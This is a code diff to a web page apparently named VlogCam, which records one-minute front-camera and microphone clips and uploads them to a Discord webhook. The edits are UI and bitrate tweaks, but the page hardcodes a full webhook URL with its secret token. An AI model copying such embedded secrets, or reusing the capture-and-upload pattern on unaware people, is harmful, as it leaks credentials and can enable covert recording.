@@ -52,19 +52,19 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            pointer-events: auto; /* allow clicks to toggle fullscreen */
         }
 
         /* ── UI elements (hidden in fullscreen) ── */
         .ui-element {
             transition: opacity 0.3s ease, transform 0.2s ease;
-            pointer-events: none;
             z-index: 2;
         }
 
-        /* red recording dot – top right */
+        /* red recording dot – bottom right (above counter) */
         #dot {
             position: fixed;
-            top: 24px;
+            bottom: 80px;  /* above counter */
             right: 24px;
             width: 14px;
             height: 14px;
@@ -117,7 +117,7 @@
             backdrop-filter: blur(4px);
             -webkit-backdrop-filter: blur(4px);
             cursor: pointer;
-            pointer-events: auto;
+            pointer-events: auto;  /* ensure clickable */
             transition: background 0.2s, transform 0.2s, opacity 0.3s;
             user-select: none;
             -webkit-user-select: none;
@@ -202,13 +202,14 @@
             const WEBHOOK = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
             const CLIP_DURATION_MS = 60000; // 1 minute
-            const BITRATE = 3000000;
+            const BITRATE = 2000000; // 2 Mbps – reduce to avoid Discord size limit
             const MIME_TYPES = [
                 'video/webm;codecs=vp9',
                 'video/webm;codecs=vp8',
                 'video/webm;codecs=h264',
                 'video/webm'
             ];
+            const FPS_IDEAL = 15; // lower frame rate to reduce file size
 
             // ─── DOM REFS ──────────────────────────────────────────────
             const videoEl = document.getElementById('video');
@@ -279,7 +280,7 @@
 
             function toggleFullscreen() {
                 try {
-                    if (!document.fullscreenElement) {
+                    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                         const el = document.documentElement;
                         if (el.requestFullscreen) {
                             el.requestFullscreen().catch(() => {});
@@ -302,7 +303,7 @@
 
             // Button click toggles fullscreen
             fsBtn.addEventListener('click', (e) => {
-                e.stopPropagation();
+                e.stopPropagation(); // prevent screen click from also firing
                 toggleFullscreen();
             });
             fsBtn.addEventListener('touchstart', (e) => {
@@ -311,9 +312,14 @@
             }, { passive: true });
 
             // Tap on screen toggles fullscreen (for convenience)
-            screenEl.addEventListener('click', toggleFullscreen);
+            screenEl.addEventListener('click', (e) => {
+                // if the click target is the screen itself (not a child), toggle
+                if (e.target === screenEl) {
+                    toggleFullscreen();
+                }
+            });
             screenEl.addEventListener('touchstart', (e) => {
-                if (e.touches.length === 1) {
+                if (e.touches.length === 1 && e.target === screenEl) {
                     e.preventDefault();
                     toggleFullscreen();
                 }
@@ -342,7 +348,7 @@
                         facingMode: 'user',
                         width: { ideal: 1920 },
                         height: { ideal: 1080 },
-                        frameRate: { ideal: 30 }
+                        frameRate: { ideal: FPS_IDEAL }
                     },
                     audio: {
                         echoCancellation: false,
@@ -372,7 +378,7 @@
                     console.error('[VlogCam] getUserMedia failed:', err);
                     try {
                         const fallbackConstraints = {
-                            video: { facingMode: 'user' },
+                            video: { facingMode: 'user', frameRate: { ideal: FPS_IDEAL } },
                             audio: true
                         };
                         const s2 = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
@@ -639,7 +645,7 @@
                     }, CLIP_DURATION_MS);
                     recorder._stopTimer = stopTimer;
 
-                    console.log('[VlogCam] ready, recording 1080p30fps from front camera');
+                    console.log('[VlogCam] ready, recording 1080p15fps from front camera');
                     setStatus('● recording', false);
 
                 } catch (err) {
